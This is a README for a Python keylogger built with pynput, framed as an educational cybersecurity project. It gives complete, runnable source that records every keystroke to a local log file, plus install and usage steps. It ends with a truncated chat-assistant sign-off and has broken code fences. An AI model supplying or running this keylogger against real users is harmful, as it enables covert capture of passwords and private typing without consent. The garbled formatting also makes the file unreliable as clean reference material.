# 🛡️ Python Keylogger using `pynput`

This is a simple keylogger script built in Python using the `pynput` library. It captures all keystrokes made by the user and logs them into a file named `log.txt`.

> ⚠️ **DISCLAIMER:** This project is for educational and ethical use only. Never use keyloggers to collect information without proper authorization.

---

## 📜 Features

- Records all keystrokes (alphanumeric and special keys)
- Handles space, enter, and other common keys cleanly
- Saves keystrokes to a local text file (`log.txt`)
- Simple and lightweight — ideal for learning purposes

---

## 🛠️ Requirements

- Python 3.x
- `pynput` library

Install `pynput` using pip:

```bash
pip install pynput
📄 How It Works
The script listens to keyboard events and writes them to log.txt in real time. Special keys like Enter, Space, and Shift are formatted to make the log readable.

▶️ Usage
Clone or download the project.

Run the script:

bash
Copy code
python keylogger.py
The log will be saved in log.txt in the same directory.

🧠 Code Overview
python
Copy code
from pynput.keyboard import Listener

def write_to_file(key):
    try:
        letter = key.char
    except AttributeError:
        if key == key.space:
            letter = ' '
        elif key == key.enter:
            letter = '\n'
        else:
            letter = f'[{key.name}]'

    with open("log.txt", 'a') as f:
        f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()
✅ Use Case
Learn how keyboard events work

Explore basic cybersecurity and ethical hacking

Understand how logging and file I/O work in Python

📌 Note
This keylogger is a simple proof-of-concept and not meant for malicious purposes. Be responsible and follow ethical guidelines when using or modifying this code.

🔐 License
This project is licensed under the MIT License.

🙌 Credits
Developed by Gowri Javgal as part of a cybersecurity learning project.

yaml
Copy code

---

Let me know if you'd like to convert this into a downloadable `.md` file or ad
